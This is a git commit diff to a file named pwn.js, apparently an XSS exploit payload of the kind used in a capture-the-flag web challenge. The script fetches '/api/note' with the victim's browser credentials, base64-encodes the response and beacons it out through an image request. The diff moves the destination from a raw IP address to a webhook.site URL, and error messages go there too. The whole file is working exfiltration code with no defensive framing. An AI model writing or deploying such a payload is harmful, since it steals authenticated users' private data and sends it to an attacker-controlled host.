320fb8866dbae4610d1e782d2372f9e752044c5b
PashtrikZogaj2 <154448655+PashtrikZogaj2@users.noreply.github.com>
2025-09-13 12:49:04 +0200

    Update pwn.js

--- pwn.js
+++ pwn.js
@@ -3,9 +3,10 @@
     const r = await fetch('/api/note', {credentials:'include'});
     const j = await r.json().catch(()=>null);
     const data = j && j.note ? j.note : await r.text();
-    new Image().src = 'http://213.163.100.234:8000/log?d=' +
+    new Image().src = 'https://webhook.site/0f85ed0a-d8a0-498a-8ee9-c34554ee027a/log?d=' +
       encodeURIComponent(btoa(unescape(encodeURIComponent(String(data)))));
   } catch(e) {
-    new Image().src = 'http://213.163.100.234:8000/err?e=' + encodeURIComponent(String(e));
+    new Image().src = 'https://webhook.site/0f85ed0a-d8a0-498a-8ee9-c34554ee027a/err?e=' +
+      encodeURIComponent(String(e));
   }
 })();
